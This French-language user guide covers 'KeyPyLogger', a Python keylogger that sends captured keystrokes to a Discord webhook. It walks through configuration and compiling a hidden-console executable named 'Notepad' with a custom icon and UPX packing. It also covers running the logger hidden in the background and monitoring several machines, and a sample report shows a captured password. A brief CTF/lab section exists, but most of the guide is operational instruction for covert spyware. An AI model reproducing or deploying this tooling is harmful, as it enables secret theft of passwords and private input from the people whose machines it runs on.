# 📘 Guide d'Utilisation - KeyPyLogger

## Table des Matières
- [Utilisation Basique](#utilisation-basique)
- [Configuration Avancée](#configuration-avancée)
- [Compilation Windows](#compilation-windows)
- [Analyse des Logs](#analyse-des-logs)
- [Bonnes Pratiques](#bonnes-pratiques)

---

## Utilisation Basique

### Windows

```bash
# 1. Éditer la configuration
notepad src/windows/keylogger_windows.py

# 2. Modifier ligne 20
WEBHOOK_URL = "https://discord.com/api/webhooks/VOTRE_WEBHOOK"

# 3. Exécuter
python src/windows/keylogger_windows.py
```

### Linux

```bash
# 1. Éditer la configuration
nano src/linux/keylogger_linux.py

# 2. Modifier ligne 20
WEBHOOK_URL = "https://discord.com/api/webhooks/VOTRE_WEBHOOK"

# 3. Exécuter
python3 src/linux/keylogger_linux.py
```

---

## Configuration Avancée

### Paramètres Principaux

Dans le fichier source, modifiez ces variables :

```python
# URL du webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/..."

# Intervalle d'envoi (en secondes)
SEND_INTERVAL = 60  # 60 = 1 minute

# Taille max du buffer avant envoi forcé
MAX_BUFFER_SIZE = 1000  # 1000 caractères
```

### Exemples de Configuration

**Test rapide** (envoi toutes les 10 secondes) :
```python
SEND_INTERVAL = 10
MAX_BUFFER_SIZE = 100
```

**Surveillance longue durée** (envoi toutes les 10 minutes) :
```python
SEND_INTERVAL = 600  # 10 minutes
MAX_BUFFER_SIZE = 5000
```

**Mode agressif** (envoi très fréquent) :
```python
SEND_INTERVAL = 5
MAX_BUFFER_SIZE = 50
```

---

## Compilation Windows

### Compilation Simple

```bash
python tools/compile_windows.py
```

**Options** :
1. **Console cachée** : Mode discret, pas de fenêtre visible
2. **Console visible** : Mode debug, affiche les erreurs

### Compilation Manuelle

```bash
# Console cachée
python -m PyInstaller --onefile --noconsole --name Notepad src/windows/keylogger_windows.py

# Console visible (debug)
python -m PyInstaller --onefile --console --name Notepad_Debug src/windows/keylogger_windows.py
```

### Options Avancées PyInstaller

```bash
# Avec icône personnalisée
pyinstaller --onefile --noconsole --icon=icon.ico --name Notepad src/windows/keylogger_windows.py

# Avec UPX compression
pyinstaller --onefile --noconsole --upx-dir=/path/to/upx --name Notepad src/windows/keylogger_windows.py

# Mode debug (garde les fichiers temporaires)
pyinstaller --onefile --console --debug all --name Notepad_Debug src/windows/keylogger_windows.py
```

---

## Analyse des Logs

### Format des Messages Discord

**Message de démarrage** :
```
🚀 KeyPyLogger Started
Hostname: DESKTOP-ABC123
OS: Windows
Architecture: AMD64
...
```

**Rapport de frappes** :
```
🔑 Keylog Report - DESKTOP-ABC123
```
Hello World[ENTER]
Test 123[BACKSPACE][BACKSPACE]
password[ENTER]
```
System: Windows AMD64
Timestamp: 2025-11-15 14:30:45
Buffer Size: 156 characters
```

### Touches Spéciales

| Touche | Affichage |
|--------|-----------|
| Espace | ` ` (espace) |
| Entrée | `[ENTER]` |
| Tab | `\t` |
| Backspace | `[BACKSPACE]` |
| Delete | `[DELETE]` |
| Shift | `[SHIFT]` |
| Ctrl | `[CTRL]` |
| Alt | `[ALT]` |
| Flèches | `[UP]` `[DOWN]` `[LEFT]` `[RIGHT]` |
| Échap | `[ESC]` |

---

## Test de Connexion

### Test Avant Utilisation

```bash
python tools/test_webhook.py
```

**Ce que le test fait** :
1. Vérifie que pynput est installé
2. Teste la connexion au webhook
3. Envoie un message de test à Discord
4. Teste le listener clavier
5. Envoie les touches capturées

---

## Exécution en Arrière-Plan

### Windows (PowerShell)

```powershell
# Démarrer en arrière-plan
Start-Process python -ArgumentList "src\windows\keylogger_windows.py" -WindowStyle Hidden

# Arrêter
taskkill /IM python.exe /F
```

### Linux

```bash
# Démarrer en arrière-plan
nohup python3 src/linux/keylogger_linux.py &

# Vérifier
ps aux | grep keylogger

# Arrêter
pkill -f keylogger_linux.py
```

---

## Logs et Debug

### Mode Verbose (version modifiée)

Modifiez le code pour activer les logs :

```python
def _send_logs(self):
    """Send accumulated logs to Discord webhook"""
    if not self.log_buffer:
        return

    try:
        log_content = ''.join(self.log_buffer)
        print(f"[DEBUG] Sending {len(log_content)} characters")  # Ajout

        # ... reste du code

        if response.status_code == 204:
            print("[DEBUG] Logs sent successfully")  # Ajout
            self.log_buffer = []
        else:
            print(f"[DEBUG] Failed: {response.status_code}")  # Ajout
```

---

## Bonnes Pratiques

### Sécurité du Webhook

```python
# ✅ BON : Webhook dans variable
WEBHOOK_URL = "https://discord.com/api/webhooks/..."

# ❌ MAUVAIS : Webhook en dur partout dans le code
requests.post("https://discord.com/api/webhooks/...", ...)
```

### Gestion des Erreurs

Le keylogger utilise `try/except` pour éviter les crashs :

```python
try:
    # Code sensible
except Exception as e:
    pass  # Fail silencieux en production
```

Pour le debug, ajoutez des prints :

```python
except Exception as e:
    print(f"[ERROR] {e}")  # Pour debug
    import traceback
    traceback.print_exc()
```

### Test en Environnement Isolé

**VM recommandée** :
1. VirtualBox ou VMware
2. Snapshot avant test
3. Test du keylogger
4. Restauration du snapshot

**Sans VM** :
1. Créer un point de restauration système
2. Tester dans un compte utilisateur séparé
3. Nettoyer après test

---

## Utilisation Multi-Webhook

Pour monitorer plusieurs machines :

```python
# Machine 1
WEBHOOK_URL = "https://discord.com/api/webhooks/WEBHOOK_MACHINE_1"

# Machine 2
WEBHOOK_URL = "https://discord.com/api/webhooks/WEBHOOK_MACHINE_2"
```

Ou utilisez un webhook différent par canal Discord.

---

## Arrêt du Keylogger

### Arrêt Normal

**Windows/Linux** : `Ctrl+C` dans le terminal

### Arrêt Forcé

**Windows** :
```powershell
# Trouver le processus
tasklist | findstr python

# Tuer le processus
taskkill /PID <pid> /F
```

**Linux** :
```bash
# Trouver le processus
ps aux | grep keylogger

# Tuer le processus
kill -9 <pid>
```

---

## Surveillance et Monitoring

### Vérifier que le Keylogger Tourne

**Windows** :
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*python*"}
```

**Linux** :
```bash
ps aux | grep keylogger_linux.py
```

### Surveiller l'Utilisation Réseau

**Windows** :
```powershell
netstat -ano | findstr python
```

**Linux** :
```bash
sudo netstat -tunap | grep python
```

---

## Configuration pour CTF/Lab

### Scénario 1 : Test de Détection

1. Installer le keylogger sur une VM
2. Challenges :
   - Détecter le processus
   - Identifier les connexions réseau
   - Bloquer les envois
   - Supprimer le keylogger

### Scénario 2 : Analyse Forensique

1. Exécuter le keylogger
2. Générer du trafic clavier
3. Arrêter et analyser :
   - Logs Discord
   - Empreinte réseau
   - Artefacts système

---

## Personnalisation Avancée

### Changer le Nom dans Discord

```python
payload = {
    "username": "Mon Keylogger Custom",  # Modifier ici
    "embeds": [embed]
}
```

### Changer l'Icône Discord

```python
payload = {
    "username": "KeyPyLogger",
    "avatar_url": "https://example.com/icon.png",  # Ajouter
    "embeds": [embed]
}
```

### Ajouter des Filtres

Filtrer les mots de passe par exemple :

```python
def _format_key(self, key):
    formatted = # ... code existant

    # Filtrer les patterns
    if "password" in ''.join(self.log_buffer).lower():
        formatted = "*"  # Masquer

    return formatted
```

---

**Pour plus d'aide, voir [FAQ.md](FAQ.md)**
